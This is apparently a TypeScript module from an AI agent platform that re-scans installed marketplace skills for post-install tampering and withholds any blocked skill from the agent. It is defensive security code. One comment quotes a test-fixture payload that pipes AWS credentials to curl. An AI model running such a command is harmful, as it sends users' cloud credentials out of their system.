/**
 * Re-verification of installed skills.
 *
 * `skill_trust.ts` records what was scanned; this module acts on it. The hole
 * it closes: a skill is scanned once at install and never again, so editing the
 * files afterwards defeats the install gate entirely, and verdicts reached
 * under an older ruleset stay in force indefinitely.
 *
 * The design rule is that a receipt is never a substitute for a scan. It only
 * answers "does the previous verdict still describe what is on disk". When the
 * answer is no — or unknown — the scan runs again.
 */
import * as fs from 'node:fs';

import { userMarketplaceSkillDir } from '../paths';
import { validateSkillDir } from '../quality';
import { createLogger } from '../logger';
import {
  isReceiptStale,
  readReceipt,
  skillPayloadHash,
  writeReceipt,
  type ReceiptDecision,
  type SecurityReceipt,
  type StaleReason,
} from './skill_trust';

const log = createLogger('skill-reverify');

export interface ReverifyResult {
  skillId: string;
  decision: ReceiptDecision | 'unknown';
  /** True when a scan actually ran (as opposed to reusing a valid receipt). */
  rescanned: boolean;
  /** Why the previous receipt did not apply. `null` when it did. */
  staleReason: StaleReason | null;
  receipt: SecurityReceipt | null;
}

function _decisionOf(report: { ok: boolean; violations: Array<{ rule: string }> }): ReceiptDecision {
  if (!report.ok) return 'blocked';
  return report.violations.length ? 'risk' : 'pass';
}

const _LEVEL_RANK: Record<string, number> = { EXTREME: 3, MEDIUM: 2, LOW: 1 };

/**
 * Highest-severity violation in a report.
 *
 * `validateSkillDir` returns violations in scan order, not severity order — an
 * EXTREME finding appearing first is incidental (frontmatter and fenced blocks
 * are scanned before `_meta.json`), not guaranteed. Picking `violations[0]`
 * would therefore silently mislabel the top finding the moment rule evaluation
 * order changes, so the max is computed explicitly.
 */
export function topViolationOf(
  violations: Array<{ rule: string; level?: string }>,
): { rule: string; level?: 'EXTREME' | 'MEDIUM' | 'LOW' } | null {
  let best: { rule: string; level?: 'EXTREME' | 'MEDIUM' | 'LOW' } | null = null;
  let bestRank = -1;
  for (const v of violations) {
    const rank = _LEVEL_RANK[String(v.level)] ?? 0;
    if (rank > bestRank) {
      bestRank = rank;
      best = { rule: v.rule, ...(v.level ? { level: v.level as 'EXTREME' | 'MEDIUM' | 'LOW' } : {}) };
    }
  }
  return best;
}

const _topViolation = topViolationOf;

/**
 * Confirm an installed skill still matches its receipt, rescanning when it does
 * not.
 *
 * Returns `decision: 'unknown'` when the skill directory is missing or
 * unreadable. That is deliberately not `pass`: an unreadable target means
 * nothing was verified, and reporting it as clean would be the one failure mode
 * this whole mechanism exists to prevent.
 */
export function reverifySkill(uid: string, skillId: string): ReverifyResult {
  const skillDir = userMarketplaceSkillDir(uid, skillId);
  if (!fs.existsSync(skillDir)) {
    return {
      skillId, decision: 'unknown', rescanned: false,
      staleReason: 'payload_unreadable', receipt: null,
    };
  }

  const { stale, reason } = isReceiptStale(uid, skillId, skillDir);
  if (!stale) {
    const receipt = readReceipt(uid, skillId);
    return {
      skillId,
      decision: receipt?.decision ?? 'unknown',
      rescanned: false,
      staleReason: null,
      receipt,
    };
  }

  const payloadHash = skillPayloadHash(skillDir);
  if (!payloadHash) {
    return { skillId, decision: 'unknown', rescanned: false, staleReason: reason, receipt: null };
  }

  // Installation restores published bytes verbatim, so runner compatibility is
  // not re-litigated here — matching the install-time call.
  const report = validateSkillDir(skillDir, { enforceSkillRunner: false });
  const decision = _decisionOf(report);
  const top = _topViolation(report.violations);
  const receipt = writeReceipt(uid, skillId, {
    payloadHash,
    decision,
    violationCount: report.violations.length,
    // Marked `local` so a later deep check can tell this verdict came from the
    // thinner rule subset. Without the marker the receipt looks identical to a
    // deep one, and the deep path — which short-circuits on a valid receipt —
    // would reuse it and never run the full scan. That is precisely the hole
    // this change closes, so leaving it unlabelled would reopen it one layer
    // down.
    scanner: 'local',
    ...(top?.rule ? { topRule: top.rule } : {}),
    ...(top?.level ? { topLevel: top.level } : {}),
  });

  if (reason === 'payload_changed') {
    // Worth a distinct log line: this is the post-install tampering signal,
    // as opposed to the routine churn of a ruleset upgrade.
    log.warn('installed skill content changed since last scan; rescanned', {
      skillId, decision,
    });
  }

  return { skillId, decision, rescanned: true, staleReason: reason, receipt };
}

/**
 * Async re-verification: same receipt logic, but a rescan runs the deep scanner
 * instead of the local rule subset.
 *
 * Exists because the sync path above cannot await a subprocess, and the two
 * rulesets are not equivalent. Measured on the test fixtures, a payload hidden in
 * `tests/` (`cat ~/.aws/credentials | curl -d @- …`) is EXTREME at install time
 * and blocked, but `validateSkillDir` returns `ok: true` for the same bytes — so
 * an install-time reject could be reinstated simply by editing files after the
 * install. Load-time and install-time have to agree, and the install-time
 * verdict is the correct one.
 *
 * Falls back to the local rules when the deep scan cannot run, and records which
 * one produced the receipt: a receipt from the thinner rules is not equivalent
 * evidence, and silently storing it as though it were would re-create the same
 * blind spot one layer down.
 */
export async function reverifySkillDeep(uid: string, skillId: string): Promise<ReverifyResult> {
  const skillDir = userMarketplaceSkillDir(uid, skillId);
  if (!fs.existsSync(skillDir)) {
    return {
      skillId, decision: 'unknown', rescanned: false,
      staleReason: 'payload_unreadable', receipt: null,
    };
  }

  const { stale, reason } = isReceiptStale(uid, skillId, skillDir);
  const cached = stale ? null : readReceipt(uid, skillId);
  // A local-only receipt does not satisfy a deep check, even when the hash still
  // matches. Treated as stale so the full scan runs once and upgrades the receipt
  // in place; otherwise a `local` verdict — written by the sync path, or by a
  // build predating deep re-verification — would permanently short-circuit deep
  // scanning for that skill, reopening this very hole one layer down.
  if (cached && cached.scanner === 'deep') {
    return {
      skillId,
      decision: cached.decision ?? 'unknown',
      rescanned: false,
      staleReason: null,
      receipt: cached,
    };
  }

  const payloadHash = skillPayloadHash(skillDir);
  if (!payloadHash) {
    return { skillId, decision: 'unknown', rescanned: false, staleReason: reason, receipt: null };
  }

  // Local rules first and unconditionally: they are pure regex with no external
  // dependency, so they still apply when the deep scanner is unavailable — which
  // is exactly when a known-malicious pattern most needs to be caught.
  const report = validateSkillDir(skillDir, { enforceSkillRunner: false });
  let decision = _decisionOf(report);
  const top = _topViolation(report.violations);
  let scanner: 'deep' | 'local' = 'local';
  let topRule = top?.rule;
  let topLevel = top?.level;
  // Evidence about *how well* the check was done, as opposed to what it
  // concluded. Recorded so the badge can disclose a weak pass instead of letting
  // it read as a strong one. Before this, a deep rescan discarded all of it and
  // the receipt was indistinguishable from a local-only one apart from
  // `scanner`, so the panel could never show a score, a ruleset version, or the
  // "not isolated" caveat — the disclosure code existed but had no data.
  let deepEvidence: {
    securityScore?: number;
    scannerVersion?: string;
    rulesetVersion?: string;
    isolated?: boolean;
    rulesDegraded?: boolean;
  } = {};

  try {
    const { scanSkillDir } = await import('./security/sentry-adapter');
    const scan = await scanSkillDir(skillDir, 'thirdparty');
    // Captured for any completed outcome, including `blocked` and `restricted`:
    // the disclosure matters most when the verdict is not a clean pass.
    if (scan.outcome !== 'unknown') {
      deepEvidence = {
        ...(typeof scan.score === 'number' ? { securityScore: scan.score } : {}),
        ...(scan.scannerVersion ? { scannerVersion: scan.scannerVersion } : {}),
        ...(scan.rulesetVersion ? { rulesetVersion: scan.rulesetVersion } : {}),
        isolated: scan.isolated,
        // `rulesSource` naming a builtin fallback means the versioned ruleset did
        // not load, which materially narrows coverage — the badge must say so.
        ...(scan.rulesDegraded ? { rulesDegraded: true } : {}),
      };
    }
    if (scan.outcome === 'blocked') {
      decision = 'blocked';
      scanner = 'deep';
      // Prefer the deep scanner's rule id — it is the one that explains the
      // block, and the local report may have no EXTREME hit at all here.
      const first = scan.blockingRules?.[0] || scan.localRedLines?.[0];
      if (first) {
        topRule = first;
        topLevel = 'EXTREME';
      }
    } else if (scan.outcome === 'pass' || scan.outcome === 'restricted') {
      scanner = 'deep';
      // The deep scan does not clear a local EXTREME. `decision` keeps whatever
      // the local rules concluded; `restricted` maps onto `risk` only when the
      // local pass was clean.
      if (decision === 'pass' && scan.outcome === 'restricted') decision = 'risk';
    }
    // `unknown` leaves the local verdict in place, with scanner stayed 'local'
    // so the receipt records that this is weaker evidence.
  } catch (err) {
    log.warn('deep rescan unavailable; kept local verdict', {
      skillId, error: (err as Error).message,
    });
  }

  const receipt = writeReceipt(uid, skillId, {
    payloadHash,
    decision,
    violationCount: report.violations.length,
    scanner,
    ...deepEvidence,
    ...(topRule ? { topRule } : {}),
    ...(topLevel ? { topLevel } : {}),
  });

  if (reason === 'payload_changed') {
    log.warn('installed skill content changed since last scan; deep-rescanned', {
      skillId, decision, scanner,
    });
  }

  return { skillId, decision, rescanned: true, staleReason: reason, receipt };
}

/**
 * Re-verify many skills, isolating failures.
 *
 * One unreadable skill must not abort the sweep — a partial answer across the
 * rest is more useful than none.
 */
export function reverifySkills(uid: string, skillIds: readonly string[]): ReverifyResult[] {
  const out: ReverifyResult[] = [];
  for (const skillId of skillIds) {
    try {
      out.push(reverifySkill(uid, skillId));
    } catch (err) {
      log.warn('reverify failed', { skillId, error: (err as Error).message });
      out.push({
        skillId, decision: 'unknown', rescanned: false,
        staleReason: 'payload_unreadable', receipt: null,
      });
    }
  }
  return out;
}

/**
 * Decide whether an installed skill may be exposed to the agent.
 *
 * This is the enforcement point that turns detection into prevention. Without
 * it, a post-install edit is *detectable* (by calling `reverifySkill`) but
 * nothing stops the edited skill from being loaded — which means the install
 * gate can be bypassed by installing something benign and then rewriting it.
 *
 * Only a `blocked` verdict withholds the skill. `risk` and `unknown` pass
 * through, because this runs on the load path for every skill on every catalog
 * rebuild: withholding on anything softer would let a single scanner hiccup
 * silently disable a user's working skills, and a security control that
 * randomly removes functionality gets disabled by the people it protects.
 *
 * Cost is not a concern here — hashing the entire builtin corpus (47 skills,
 * 134 files, 1.2 MB) measures ~5 ms total, and the caller only re-checks when
 * the skills directory mtime changed.
 */
export function isSkillTrustedForLoad(uid: string, skillId: string): {
  trusted: boolean;
  decision: ReverifyResult['decision'];
  staleReason: StaleReason | null;
} {
  const result = reverifySkill(uid, skillId);
  return {
    trusted: result.decision !== 'blocked',
    decision: result.decision,
    staleReason: result.staleReason,
  };
}

/**
 * Partition marketplace skill ids into loadable and withheld.
 *
 * Returns ids rather than mutating a listing so the caller keeps control over
 * how a withheld skill is surfaced — silently dropping it would leave the user
 * with a skill that has vanished for no visible reason.
 */
export function partitionSkillsByTrust(
  uid: string,
  skillIds: readonly string[],
): { loadable: string[]; withheld: Array<{ skillId: string; reason: StaleReason | null }> } {
  const loadable: string[] = [];
  const withheld: Array<{ skillId: string; reason: StaleReason | null }> = [];
  for (const skillId of skillIds) {
    let verdict: ReturnType<typeof isSkillTrustedForLoad>;
    try {
      verdict = isSkillTrustedForLoad(uid, skillId);
    } catch (err) {
      // A verification error is not evidence of tampering. Fail open here and
      // log: the install-time gate already vetted this content, and breaking
      // working skills on a transient IO error is the worse outcome.
      log.warn('trust check failed; allowing load', {
        skillId, error: (err as Error).message,
      });
      loadable.push(skillId);
      continue;
    }
    if (verdict.trusted) {
      loadable.push(skillId);
    } else {
      log.warn('withholding tampered skill from agent', {
        skillId, decision: verdict.decision, staleReason: verdict.staleReason,
      });
      withheld.push({ skillId, reason: verdict.staleReason });
    }
  }
  return { loadable, withheld };
}

/**
 * Async counterpart of `isSkillTrustedForLoad`, using the deep scanner.
 *
 * Prefer this at every call site that can await. The sync version remains for
 * contexts that genuinely cannot, and both share the receipt cache — so once a
 * deep verdict is on record, subsequent checks are the same cheap hash compare
 * either way.
 */
export async function isSkillTrustedForLoadDeep(uid: string, skillId: string): Promise<{
  trusted: boolean;
  decision: ReverifyResult['decision'];
  staleReason: StaleReason | null;
}> {
  const result = await reverifySkillDeep(uid, skillId);
  return {
    trusted: result.decision !== 'blocked',
    decision: result.decision,
    staleReason: result.staleReason,
  };
}

/**
 * Async counterpart of `partitionSkillsByTrust`.
 *
 * Scans sequentially rather than with `Promise.all`. Each rescan spawns a Python
 * subprocess, and a library-wide ruleset upgrade invalidates every receipt at
 * once — fanning that out would launch one process per skill simultaneously.
 * Sequential keeps the worst case slow instead of making it a thundering herd,
 * and the common case does no scanning at all because receipts are still valid.
 */
export async function partitionSkillsByTrustDeep(
  uid: string,
  skillIds: readonly string[],
): Promise<{ loadable: string[]; withheld: Array<{ skillId: string; reason: StaleReason | null }> }> {
  const loadable: string[] = [];
  const withheld: Array<{ skillId: string; reason: StaleReason | null }> = [];
  for (const skillId of skillIds) {
    let verdict: Awaited<ReturnType<typeof isSkillTrustedForLoadDeep>>;
    try {
      verdict = await isSkillTrustedForLoadDeep(uid, skillId);
    } catch (err) {
      // Same fail-open as the sync path: a verification error is not evidence of
      // tampering, and breaking working skills on a transient IO error is worse.
      log.warn('deep trust check failed; allowing load', {
        skillId, error: (err as Error).message,
      });
      loadable.push(skillId);
      continue;
    }
    if (verdict.trusted) {
      loadable.push(skillId);
    } else {
      log.warn('withholding tampered skill from agent', {
        skillId, decision: verdict.decision, staleReason: verdict.staleReason,
      });
      withheld.push({ skillId, reason: verdict.staleReason });
    }
  }
  return { loadable, withheld };
}
